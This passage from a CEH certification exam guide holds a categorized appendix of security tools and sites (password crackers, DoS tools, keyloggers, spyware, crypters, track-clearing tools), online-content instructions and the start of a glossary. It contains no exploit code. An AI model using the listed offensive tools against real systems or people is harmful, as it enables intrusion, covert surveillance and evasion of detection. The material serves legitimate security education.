CEH Certified Ethical Hacker All-in-One Exam Guide

510

NTP Enumeration
• Atom Sync www.atomsync.com

• LAN Time Analyzer www.bytefusion.com

• NTP Server Scanner www.bytefusion.com

• NTP Time Server Monitor www.meinbergglobal.com

Registry Tools
• Active Registry Monitor www.devicelock.com

• All-seeing-Eye www.fortego.com

• Comodo Cloud Scanner www.comodo.com

• Power Tools www.macecraft.com

• Reg Organizer www.chemtable.com

• RegScanner www.nirsoft.net

Windows Service Monitoring Tools
• Nagios www.nagios.com

• Process Hacker http://processhacker.sourceforge.net

• SMART www.thewindowsclub.com

• SrvMan http://tools.sysprogs.org

• Sysinternals docs.microsoft.com/en-us/sysinternals/

File/Folder Integrity Checkers
• ACSV www.irnis.net

• FastSum www.fastsum.com

• FileVerifier www.programmingunlimited.net

• OSSEC https://ossec.github.io/

• Verisys www.ionx.co.uk

• WinMD5 www.blisstonia.com

System Hacking Tools
Default Password Search Links

• cirt.net

• datarecovery.com

• defaultpassword.us

• defaultpasswords.in

14-AppA.indd 510 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

511

• fortypoundhead.com

• github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/
default-passwords.csv

• www.kaggle.com/wjburns/common-password-list-rockyoutxt

• www.routerpasswords.com

• securityoverride.org

• sites.google.com/site/saynamweb/password

• softwaretestinghelp.com

Password Hacking /Attack Tools
• Aircrack www.aircrack-ng.org/

• Cain www.oxid.it

• CloudCracker www.cloudcracker.com

• DSInternals github.com

• ElcomSoft www.elcomsoft.com/

• hashcat hashcat.net

• John the Ripper www.openwall.com

• L0phtCrack l0phtcrack.com

• medussa foofus.net

• mimkatz github.com

• ophcrack ophcrack.sourceforge.net

• Passware Kit passware.com

• Password Recovery Toolkit accessdata.com

• PCUnlocker top-password.com

• Rainbow crack www.antsight.com/zsl/rainbowcrack/

• Windows Password Recovery www.windowspasswordsrecovery.com

DoS/DDos
• AnDOSid http://andosid.android.informer.com

• BanglaDos http://sourceforge.net

• Dereil/HOIC http://sourceforge.net

• DoS HTTP http://socketsoft.net

• HULK siberianlaika.ru

• LOIC http://sourceforge.net

• R U Dead Yet sourceforge.net

• Tor’s Hammer sourceforge.net

14-AppA.indd 511 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

512

Sniffing
• Capsa colasoft.com

• Ettercap www.ettercap-project.org/ettercap/#

• OmniPeek liveaction.com

• SteelCentral riverbed.com

• Wireshark www.wireshark.org/

Keyloggers and Screen Capture
• Actual Keylogger www.actualkeylogger.com

• Actual Spy www.actualspy.com

• All In One Keylogger www.relytec.com

• Amac www.amackeylogger.com

• Desktop Spy www.spyarsenal.com

• Elite elitekeylogger.com

• Ghost www.keylogger.net

• Handy Keylogger www.handy-keylogger.com

• Hidden Recorder www.oleansoft.com

• IcyScreen www.16software.com

• Keyboard Logger detective-store.com

• KeyGhost keyghost.com

• KeyGrabber USB keelog.com

• KeyProwler www.keyprowler.com

• REFOG refog.com

• Spyrix (Mac) spyrix.com

• Ultimate Keylogger www.ultimatekeylogger.com

Privilege Escalation
• BeRoot github.com

• linpostexp github.com

• Password Recovery www.windowspasswordrecovery.com

• Password Recovery Boot Disk www.rixler.com

• Password Reset www.reset-windows-password.net

• Robber github.com

• System Recovery www.elcomsoft.com

14-AppA.indd 512 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

513

Executing Applications
• Dameware www.dameware.com

• ManageEngine manageengine.com

• PDQ Deploy www.adminarsenal.com

• PSExec docs.microsoft.com

• Pupy github.com

• RemoteExec www.isdecisions.com

Spyware
• ACTIVtrak activetrak.com

• Desktop Spy www.spyarsenal.com

• eBlaster www.spectorsoft.com

• EmailObserver www.softsecurity.com

• Kahlown Screen Spy www.lesoftrejion.com

• LANVisor www.lanvisor.com

• MobileSpy mobile-spy.com

• NetVisor www.netvizor.net

• OsMonitor www.os-monitor.com

• Power Spy www.ematrixsoft.com

• Remote Desktop Spy www.global-spy-software.com

• Spector Pro www.spectorsoft.com

• SpyTech www.spytech-web.com

• SSPro www.tucows.com/preview/403921

• Veriato veriato.com

• USB Analyzer eltima.com

• USB Monitor usb-monitor.com

• USBDeview nirsoft.net

Mobile Spyware
• Easy GPS www.easygps.com

• GPS TrackMaker Professional www.trackmaker.com

• John the Ripper www.openwall.com

• Mobile Spy www.mobile-spy.com

• MobiStealth Cell Phone Spy www.mobistealth.com

14-AppA.indd 513 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

514

• Modem Spy www.modemspy.com

• mSpy www.mspy.com

• Spy Phone Gold https://spyera.com

• Trackstick www.trackstick.com

Clearing/Covering Tracks
• Auditpol docs.microsoft.com

• BleachBit bleachbit.org

• CCleaner ccleaner.com

• Clear Event Viewer tenforums.com

• Clearprog clearprog.de

• Cipher <windows command line>

• DBAN dban.org

• EraserPro www.acesoft.net

• Evidence Eliminator www.evidence-eliminator.com

• MRU-Blaster www.brightfort.com

• Privacy Eraser cybertransoft.com

• Window Washer www.eusing.com

• WinZapper www.ntsecurity.nu

• Wipe http://privacyroot.com

Packet Crafting/Spoofing
• Hping2 www.hping.org/

• Komodia www.komodia.com

• NetscanTools Pro www.netscantools.com

• Ostinato https//ostinato.org

• Packet Generator http://sourceforge.net

• PackEth http://sourceforge.net

• WireEdit wireedit.com

Session Hijacking
• Bettercap bettercap.org

• Burp Suite http://portswigger.net

• Firesheep http://codebutler.github.com/firesheep

• Hamster/Ferret http://erratasec.blogspot.com/2009/03/hamster-20-and-
ferret-20.html

14-AppA.indd 514 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

515

• Hunt http://packetstormsecurity.com

• netool sourceforge.net

• OWASP ZAP owasp.org

• ssl strip pypi.python.org

Poisoning
• LLMNR/NBT-NS Spoofing Tool github.com

• Vindicate github.com

Cryptography and Encryption
Encryption Tools

• AxCrypt www.axantum.com/axcrypt/

• BitLocker http://microsoft.com

• DriveCrypt www.securstar.com

• GNU Privacy Guard https://www.gnupg.org/

• VeraCrypt https://veracrypt.codeplex.com/

Hash Tools
• HashCalc http://nirsoft.net

• McAfee Hash Calculator www.mcafee.com/us/downloads/free-tools/hash-
calculator.aspx

• MD5 Hash www.digitalvolcano.co.uk/content/md5-hash

• Quick Hash http://sourceforge.net/projects/quickhash/

Steganography
• AudioStega www.mathworks.com

• DeepSound http://jpinsoft.net

• EzStego www.stego.com

• gifShuffle www.darkside.com.au

• ImageHide www.dancemammal.com

• Invisible Secrets www.invisiblesecrets.com/

• JPHIDE http://nixbit.com

• Masker www.softpuls.com

• Merge Streams www.ntkernel.com

• MP3Stegz http://sourceforge.net

14-AppA.indd 515 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

516

• OfficeXML www.irongeek.com

• OmniHidePro http://omnihide.com

• OpenStego http://openstego.sourceforge.net/

• OurSecret www.securekit.net

• QuickStego www.quickcrypto.com

• snow darkside.com.au

• SpamMimic www.spammimic.com

• Spy Pix (mobile) www.juicybitssoftware.com

• SSuite Picsel ssuite.com

• Stegais (mobile) http://stegais.com

• StegHide http://steghide.sourceforge.net

• Stego Master (mobile) https://play.google.com

• stegostick sourceforge.net

• texto eberi.net

• wbStego http://wbstego.wbailer.com/

• XPTools www.xptools.net

Stego Detection
• Gargoyle Investigator (stego detection) www.wetstonetech.com

• StegAlyzerSS www.sarc-wv.com

• StegDetect https://github.com/abeluck/stegdetect

• StegSpy www.spy-hunter.com

Cryptanalysis
• Cryptanalysis http://cryptanalysisto.sourceforge.net

• Cryptobench http://addario.org

• EverCrack http://evercrack.sourceforge.net

Sniffing
Packet Capture

• CACE www.cacetech.com

• Capsa www.colasoft.com

• dsniff http://monkey.org

• EtherApe http://etherape.sourceforge.net

• NetWitness www.netwitness.com

14-AppA.indd 516 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

517

• OmniPeek www.wildpackets.com

• tcpdump http://tcpdump.org

• Windump www.winpcap.org

• Wireshark http://wireshark.org

Wireless
• Kismet www.kismetwireless.net

• NetStumbler www.netstumbler.com/downloads/

MAC Flooding/Spoofing
• Macof https://monkey.org

• SMAC www.klcconsulting.net

ARP Poisoning
• Cain www.oxid.it

• UfaSoft http://ufasoft.com

• WinARP Attacker www.xfocus.net

Wireless
Discovery

• inSSIDer www.metageek.net

• iStumbler www.istumbler.net

• Kismet www.kismetwireless.net

• NetStumbler www.netstumbler.com/downloads/

• NetSurveyor www.performancewifi.net

• Vistumbler www.vistumbler.net

• WirelessMon www.passmark.com

Attack and Analysis
• Aircrack www.Aircrack-ng.org

• AirMagnet WiFi Analyzer http://airmagnet.com

• Airodump http://Wirelessdefence.org/Contents/Aircrack_airodump.htm

• AirPcap www.cacetech.com

• AirSnort http://airsnort.shmoo.com/

• MadWifi http://madwifi-project.org

• WiGLE http://wigle.net

14-AppA.indd 517 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

518

Packet Sniffing
• Capsa www.colasoft.com

• Cascade Pilot www.riverbed.com

• CommView www.tamos.com

• Omnipeek https://wildpackets-omnipeek-network-analyzer.en.softonic.com/

WEP/WPA Cracking
• Aircrack www.aircrack-ng.org/

• coWPAtty www.wirelessdefence.org

• KisMAC http://kismac-ng.org/

• WepAttack www.wepattack.sourceforge.net

• WepCrack www.wepcrack.sourceforge.net

• Wireless Security Auditor www.elcomsoft.com

Bluetooth
• BH Bluejack http://croozeus.com

• BlueScanner www.arubanetworks.com

• Bluesnarfer www.airdemon.net

• BT Audit http://trifinite.org

• BTBrowser http://wireless.klings.org

• BTScanner www.pentest.co.uk

• CIHwBT http://sourceforge.net

• Phonesnoop www.blackberryrc.com

Mobile and IoT
Mobile Attacks

• Backtrack Simulator https://play.google.com

• Bluediving http://bluediving.sourceforge.net

• BlueScanner http://sourceforge.net

• BT Browser www.bluejackingtools.com

• Super BlueTooth Hack www.brothersoft.com

• WiHack https://wihack.com

14-AppA.indd 518 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

519

Mobile Application Testing
• BlueBorne Scanner www.armis.com

• Eternal Blue Scanner ebvscanner.firebaseapp.com

• Hackode www.ravikumarpubey.com

• Shellshock www.zimperium.com

• threatScan https://free.kaspersky.com

• X-Ray https://duo.com/labs

Mobile Scanning/Sniffing
• cSploit www.csploit.org

• FaceNiff http://faceniff.ponury.net

• fing www.fing.io

• Hackode play.google.com

• WiCap play.google.com

Mobile Wireless Discovery
• Net Signal Info www.kaibits-software.com

• OpenSignal Maps http://opensignal.com

• WiFi Manager http://kmansoft.com

• WiFiFoFum www.wififofum.net

Mobile Device Tracking
• Find My Phone http://findmyphone.mangobird.com

• GadgetTrak www.gadgettrak.com

• iHound www.ihoundsoftware.com

• Where’s My Droid http://wheresmydroid.com

Mobile Device Proxy
• CyberGhost VPN https://www.cyberghostvpn.com

• NetShade www.raynersw.com

• Servers Ultimate www.icecoldapps.com

• Shadowsocks https://shadowsocks.org

Rooting/Jailbreaking
• Absinthe http://greenpois0n.com

• Cydia http://cydia.saurik.com

14-AppA.indd 519 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

520

• Evasi0n7 http://evasi0n.com

• Geeksn0w http://geeksn0w.it

• Kingo https://www.kingoapp.com/

• MTKDroid https://androidmtk.com

• One Click Root https://www.oneclickroot.com/

• Pangu http://en.pangu.io

• Redsn0w http://redsn0w.info

• Superboot (Multiple download sites)

• SuperOneClick http://superoneclick-download.soft112.com/

• TunesGo tunesgo.wondershare.com

MDM
• MaaS360 www.maas360.com

• MobiControl www.sati.net

• SAP Afaria www.sybase.com

• XenMobile www.citrix.com

IoT Tools
• Attify Zigbee Framework www.attify.com

• AWS IoT Defender aws.amazon.com

• beSTORM Vulnerability Scanner www.beyondsecurity.com

• Censys (search engine) censys.io

• ChipWhisperer newae.com

• CloudShark www.cloudshark.org

• darktarce www.darktarce.com

• DigiCert IoT Security www.digicert.com

• Firmalyzer firmalyzer.com

• Foren6 (IoT Sniffing) cetic.github.io

• Google Cloud Iot cloud.google.com

• IoT Security Platform www.pwnieexpress.com

• IoTsploit iotsploit.com

• JTAGulator grandideastudio.com

• KillerBee github.com

• MultiPing (info gathering) www.pingman.com

• RIoT Vulnerability Scanner www.beyondtrust.com

14-AppA.indd 520 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

521

• SeaCAT security www.tekalabs.com

• SecBee github.com

• Symantec IoT Security www.symantec.com

• Thingful (search engine) www.thingful.net

• Ubertooth github.com

• Z-Wave Sniffer www.suphammer.net

Trojans and Malware
Anti-Malware (Anti-Spyware and Antivirus)

• Ad-Aware www.lavasoft.com

• Avast www.avast.com

• AVG free.avg.com

• BitDefender www.bitdefender.com

• HackAlert www.armorize.com

• Kapersky www.kapersky.com

• MacScan http://macscan.securemac.com

• Malwarebytes www.malwarebytes.com

• McAfee www.mcafee.com

• Panda www.pandasecurity.com

• Spybot Search and Destroy www.safer-networking.org

• SpyHunter www.enigmasoftware.com

• SUPERAntiSpyware www.superantispyware.com

• Symantec www.symantec.com

Crypters and Packers
• Aegis www.aegiscrypter.com

• AIO FUD (Multiple download sites)

• Crypter www.crypter.com

• EliteWrap https://packetstormsecurity.com/files/14593/elitewrap.zip.html

• Galaxy Crypter (Multiple download sites)

• Heaven Crypter (Multiple download sites)

• Hidden Sight Crypter http://securecybergroup.in

• SwayzCryptor (Multiple download sites)

14-AppA.indd 521 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

522

Monitoring Tools
• Advanced Windows Service Monitor securityxploded.com

• CurrPorts www.nirsoft.net

• Driver Booster iobit.com

• Driver Fusion treexy.com

• DriverGenius drive-soft.com

• Fport www.mcafee.com/us/downloads/free-tools/fport.aspx

• Netwrix netwrix.com

• Port Monitor port-monitor.com

• ProcessHacker http://processhacker.sourceforge.net

• PRTG paessler.com

• Regshot http://sourceforge.net/projects/regshot

• SvrMan http://tools.sysprogs.org

• SysAnalyzer http://labs.idefense.com/software/malcode.php

• TCP Port Mirroring dotcom-monitor.com

• What’s Running www.whatsrunning.net

Malware Analysis
• ASpack aspack.com

• Caspa colasoft.com

• CSP File Integrity cspsecurity.com

• Cuckoo cuckoosandbox.org

• Dependency check jeremylong.github.io

• FileSeek fileseek.ca

• FLOSS fireeye.com

• Ghirda ghidra-sre.org

• Hashcalc slavasoft.com

• Hashdeep sourecforge.net

• HybridAnalysis hybrid-analysis.com

• Jotti virusscan.jotti,org

• Loggly loggly.com

• Macro_Pack github.com

• Manage Engine manageengine.com

• mimikatz github.com

14-AppA.indd 522 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

523

• Oily ollydbg.de.com

• Online Scanner fortiguard.com

• PE View aldeid.com

• Pescan tzworks.net

• ProcDump docs.microsoft.com

• ResourceHacker angusj.com

• Synk synk.io

• Sysanalyzer aldeid.com

• Verisys ionx,co,uk

Web Attacks
Attack Tools

• BlackWidow https://softbytelabs.com

• cURL http://curl.haxx.se

• Httprecon www.computec.ch

• ID Serve www.grc.com

• InstantSource www.blazingtools.com

• Metasploit www.metasploit.com

• NetBrute www.rawlogic.com

• Netsparker www.mavitunasecurity.com

• Nstalker http://nstalker.com

• SoapUI www.soapui.org

• WatcherWeb www.casaba.com

• WebInspect www8.hp.com/us/en/software-solutions/webinspect-dynamic-
analysis-dast

• WebScarab http://owasp.org

• WebSleuth http://sandsprite.com

• Wfetch www.microsoft.com

• XMLSpy www.altova.com

SQL Injection
• BSQL Hacker http://labs.portcullis.co.uk

• Marathon http://marathontool.codeplex.com

• SQL Brute http://gdssecurity.com

14-AppA.indd 523 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

524

• SQL Injection Brute http://code.google.com

• SQLGET http://darknet.org.uk

• SQLNinja http://sqlninja.sourceforge.net

Miscellaneous
Cloud Security

• Alert Logic www.alertlogic.com

• CloudPassage Halo https://www.cloudpassage.com/

• Core CloudInspect http://coreinspection.com/

• Panda Cloud Office Protection www.cloudantivirus.com

• Symantec O3 www.symantec.com

• Trend Micro Instant-On www.trendmicro.com

Cloud Services Testing
• BlazeMeter blazemeter.com/

• LoadStorm loadstorm.com

• SOASTA www.soasta.com

• Zephyr www.getzephyr.com

IDS
• AlienVault alienvault.com

• OSSEC ossec.net

• Snort www.snort.org

• Suricata suricata-ids.org

Evasion Tools
• ADMMutate www.ktwo.ca

• IDS Informer www.net-security.org

• Inundator http://inundator.sourceforge.net

• NIDSbench http://packetstormsecurity.org/UNIX/IDS/nidsbench/

• Tcp-over-dns http://analogbit.com/software/tcp-over-dns

Honeypot Tools
• KFsensor keyfocus.net

• Specter specter.com

14-AppA.indd 524 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

525

Pen Test Suites
• Armitage www.fastandeasyhacking.com

• CANVAS http://immunitysec.com

• Cobalt Strike www.cobaltstrike.com

• Codenomicon https://www.synopsys.com

• Core Impact www.coresecurity.com

• Metasploit www.metasploit.org

VPN/FW Scanner
• IKE-Scan http://sectools.org/tool/ike-scan/

Social Engineering
• Maltego maltego.com

• ShellPhish github.com

• Social Engineer Toolkit www.trustedsec.com

• WifiPhisher github.com

Extras
• Core Impact Demo https://coresecurity.webex.com/

• Sysinternals https://docs.microsoft.com/en-us/sysinternals/

• Tripwire www.tripwire.com/

Linux Distributions
• BackTrack www.remote-exploit.org/index.php/BackTrack

• Distrowatch http://distrowatch.com

Tools, Sites, and References Disclaimer
All URLs listed in this appendix were current and live at the time of writing.
McGraw Hill makes no warranty as to the availability of these World Wide Web
or Internet pages. McGraw Hill has not reviewed or approved the accuracy of the
contents of these pages and specifically disclaims any warranties of merchantability
or fitness for a particular purpose.

14-AppA.indd 525 14/09/21 4:08 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix B

APPENDIX

About the Online Content B

This book comes complete with TotalTester Online customizable practice exam software
containing 300 practice exam questions.

System Requirements
The current and previous major versions of the following desktop browsers are recom-
mended and supported: Chrome, Microsoft Edge, Firefox, and Safari. These browsers
update frequently, and sometimes an update may cause compatibility issues with the
TotalTester Online or other content hosted on the Training Hub. If you run into a prob-
lem using one of these browsers, please try using another until the problem is resolved.

Your Total Seminars Training Hub Account
To get access to the online content you will need to create an account on the Total
Seminars Training Hub. Registration is free, and you will be able to track all your online
content using your account. You may also opt in if you wish to receive marketing infor-
mation from McGraw Hill or Total Seminars, but this is not required for you to gain
access to the online content.

Privacy Notice
McGraw Hill values your privacy. Please be sure to read the Privacy Notice available dur-
ing registration to see how the information you have provided will be used. You may view
our Corporate Customer Privacy Policy by visiting the McGraw Hill Privacy Center.
Visit the mheducation.com site and click Privacy at the bottom of the page.

Single User License Terms and Conditions
Online access to the digital content included with this book is governed by the
McGraw Hill License Agreement outlined next. By using this digital content you
agree to the terms of that license.

527

15-AppB.indd 527 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix B

CEH Certified Ethical Hacker All-in-One Exam Guide

528

Access To register and activate your Total Seminars Training Hub account, simply fol-
low these easy steps:

1. Go to this URL: hub.totalsem.com/mheclaim
2. To register and create a new Training Hub account, enter your e-mail address,

name, and password on the Register tab. No further personal information
(such as credit card number) is required to create an account.
If you already have a Total Seminars Training Hub account, enter your e-mail
address and password on the Log in tab.

3. Enter your Product Key: cckx-9nxm-cj6t

4. Click to accept the user license terms.
5. For new users, click the Register and Claim button to create your account.

For existing users, click the Log in and Claim button.
You will be taken to the Training Hub and have access to the content for this book.

Duration of License Access to your online content through the Total Seminars Training
Hub will expire one year from the date the publisher declares the book out of print.

Your purchase of this McGraw Hill product, including its access code, through a retail
store is subject to the refund policy of that store.

The Content is a copyrighted work of McGraw Hill, and McGraw Hill reserves all
rights in and to the Content. The Work is © 2022 by McGraw Hill.

Restrictions on Transfer The user is receiving only a limited right to use the Content
for the user’s own internal and personal use, dependent on purchase and continued
ownership of this book. The user may not reproduce, forward, modify, create deriva-
tive works based upon, transmit, distribute, disseminate, sell, publish, or sublicense the
Content or in any way commingle the Content with other third-party content without
McGraw Hill’s consent.

Limited Warranty The McGraw Hill Content is provided on an “as is” basis. Neither
McGraw Hill nor its licensors make any guarantees or warranties of any kind, either
express or implied, including, but not limited to, implied warranties of merchantability or
fitness for a particular purpose or use as to any McGraw Hill Content or the information
therein or any warranties as to the accuracy, completeness, correctness, or results to be
obtained from, accessing or using the McGraw Hill Content, or any material referenced in
such Content or any information entered into licensee’s product by users or other persons
and/or any material available on or that can be accessed through the licensee’s product
(including via any hyperlink or otherwise) or as to non-infringement of third-party rights.
Any warranties of any kind, whether express or implied, are disclaimed. Any material or
data obtained through use of the McGraw Hill Content is at your own discretion and
risk and user understands that it will be solely responsible for any resulting damage to its
computer system or loss of data.

15-AppB.indd 528 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix B

Appendix B: About the Online Content

529

Neither McGraw Hill nor its licensors shall be liable to any subscriber or to any user or
anyone else for any inaccuracy, delay, interruption in service, error or omission, regardless
of cause, or for any damage resulting therefrom.

In no event will McGraw Hill or its licensors be liable for any indirect, special or
consequential damages, including but not limited to, lost time, lost money, lost profits or
good will, whether in contract, tort, strict liability or otherwise, and whether or not such
damages are foreseen or unforeseen with respect to any use of the McGraw Hill Content.

TotalTester Online
TotalTester Online provides you with a simulation of the CEH v11 exam. Exams can be
taken in Practice Mode or Exam Mode. Practice Mode provides an assistance window
with hints, references to the book, explanations of the correct and incorrect answers, and
the option to check your answer as you take the test. Exam Mode provides a simula-
tion of the actual exam. The number of questions, the types of questions, and the time
allowed are intended to be an accurate representation of the exam environment. The
option to customize your quiz allows you to create custom exams from selected domains
or chapters, and you can further customize the number of questions and time allowed.

To take a test, follow the instructions provided in the previous section to register and
activate your Total Seminars Training Hub account. When you register, you will be taken
to the Total Seminars Training Hub. From the Training Hub Home page, select your
certification from the Study drop-down menu at the top of the page to drill down to the
TotalTester for your book. You can also scroll to it from the list of Your Topics on the
Home page, and then click the TotalTester link to launch the TotalTester. Once you’ve
launched your TotalTester, you can select the option to customize your quiz and begin
testing yourself in Practice Mode or Exam Mode. All exams provide an overall grade and
a grade broken down by domain.

Technical Support
For questions regarding the Total Tester software or operation of the Training Hub, visit
www.totalsem.com or e-mail support@totalsem.com.

For questions regarding book content, visitwww.mheducation.com/customerservice.

15-AppB.indd 529 14/09/21 4:08 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

GLOSSARY

802.11 Wireless LAN standards created by IEEE. 802.11a runs at up to 54 Mbps at
5 GHz, 802.11b runs at up to 11 Mbps at 2.4 GHz, 802.11g runs at up to 54 Mbps at
2.4 GHz, and 802.11n can run upward of 150 Mbps. 802.11n has speeds over 100 Mbps
and uses a variety of ranges in MIMO format between 2.4 GHz and 5 GHz.

802.11i
A wireless LAN security standard developed by IEEE. Requires Temporal Key Integrity
Protocol (TKIP) and Advanced Encryption Standard (AES).

acceptable use policy (AUP) Policy stating what users of a system can and cannot do
with the organization’s assets.

access control list (ACL) A method of defining what rights and permissions an entity
has to a given resource. In networking, access control lists are commonly associated with
firewall and router traffic-filtering rules.

access creep Occurs when authorized users accumulate excess privileges on a system
because of moving from one position to another; allowances accidentally remain with the
account from position to position.

access point (AP) A wireless LAN device that acts as a central point for all wireless traf-
fic. The AP is connected to both the wireless LAN and the wired LAN, providing wireless
clients access to network resources.

accountability The ability to trace actions performed on a system to a specific user or
system entity.

acknowledgment (ACK) A TCP flag notifying an originating station that the preced-
ing packet (or packets) has been received.

active attack An attack that is direct in nature—usually where the attacker injects
something into, or otherwise alters, the network or system target.

Active Directory (AD) The directory service created by Microsoft for use on its net-
works. It provides a variety of network services using Lightweight Directory Access
Protocol (LDAP), Kerberos-based authentication, and single sign-on for user access to
network-based resources.

active fingerprinting Injecting traffic into the network to identify the operating
system of a device.

531

16-Glossary.indd 531 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

532

ad hoc mode A mode of operation in a wireless LAN in which clients send data
directly to one another without utilizing a wireless access point (WAP), much like a
point-to-point wired connection.

Address Resolution Protocol (ARP) A protocol used to map a known IP address to a
physical (MAC) address. It is defined in RFC 826. The ARP table is a list of IP addresses
and corresponding MAC addresses stored on a local computer.

adware Software that has advertisements embedded within it. It generally displays ads
in the form of pop-ups.

algorithm A step-by-step method of solving a problem. In computing security, an algo-
rithm is a set of mathematical rules (logic) for the process of encryption and decryption.

annualized loss expectancy (ALE) A measurement of the cost of an asset’s value to
the organization and the monetary loss that can be expected for an asset due to risk over
a one-year period. ALE is the product of the annualized rate of occurrence (ARO) and
the single loss expectancy (SLE). It is mathematically expressed as ALE = ARO × SLE.

annualized rate of occurrence (ARO) An estimate of the number of times during a
year a particular asset would be lost or experience downtime.

anonymizer A device or service designed to obfuscate traffic between a client and the
Internet. It is generally used to make activity on the Internet as untraceable as possible.

anti-malware An application that monitors a computer or network to identify, and
prevent, malware. AV (antivirus) applications are usually signature based and can take
multiple actions on defined malware files/activity.

Application layer Layer 7 of the OSI reference model. The Application layer provides
services to applications to allow them access to the network. Protocols such as FTP and
SMTP reside here.

application-level attack Attack on the actual programming code of an application.

archive A collection of historical records or the place where they are kept. In computing,
an archive generally refers to backup copies of logs and/or data.

assessment Activities to determine the extent to which a security control is imple-
mented correctly, operating as intended, and producing the desired outcome with respect
to meeting the security requirements for the system.

asset Any item of value or worth to an organization, whether physical or virtual.

asymmetric Literally, “not balanced or the same.” In networking, asymmetric refers to
a difference in networking speeds upstream and downstream. In cryptography, it’s the use
of more than one key for encryption/authentication purposes.

asymmetric algorithm In computer security, an algorithm that uses separate keys for
encryption and decryption.

16-Glossary.indd 532 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

533

asynchronous 1. The lack of clocking (imposed time ordering) on a bit stream. 2. An
industry term referring to an implant or malware that does not require active interac-
tion from the attacker. 3. An implant or malware where command/task execution and
the return of results or data are set to predefined intervals or timelines versus real-time
execution.

asynchronous transmission The transmission of digital signals without precise clock-
ing or synchronization.

audit Independent review and examination of records and activities to assess the ade-
quacy of system controls, to ensure compliance with established policies and operational
procedures, and to recommend necessary changes.

audit data Chronological record of system activities to enable the reconstruction and
examination of the sequence of events and changes in an event.

audit trail A record showing which user has accessed a given resource and what opera-
tions the user performed during a given period.

auditing The process of recording activity on a system for monitoring and later review.

authentication The process of determining whether a network entity (user or service)
is legitimate—usually accomplished through a user ID and password. Authentication
measures are categorized by something you know (user ID and password), something
you have (smart card or token), or something you are (biometrics).

authentication, authorization, and accounting (AAA) Authentication confirms the
identity of the user or device. Authorization determines the privileges (rights) of the user
or device. Accounting records the access attempts, both successful and unsuccessful.

Authentication Header (AH) An Internet Protocol Security (IPSec) header used to
verify that the contents of a packet have not been modified while the packet was in transit.

authenticity Sometimes included as a fundamental security element, refers to the
characteristic of data that ensures it is genuine.

authorization The conveying of official access or legal power to a person or entity.

availability The condition of a resource being ready for use and accessible by autho-
rized users.

back door A hidden capability in a system or program for bypassing normal com-
puter authentication systems. A back door can be purposeful or the result of malware
or other attack.

banner grabbing An enumeration technique used to provide information about
a computer system; generally used for operating system identification (also known as
fingerprinting).

baseline A point of reference used to mark an initial state in order to manage change.

16-Glossary.indd 533 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

534

bastion host A computer placed outside a firewall to provide public services to other
Internet sites and hardened to resist external attacks.

biometrics A measurable, physical characteristic used to recognize the identity, or to
verify the claimed identity, of an applicant. Facial images, fingerprints, and handwriting
samples are all examples of biometrics.
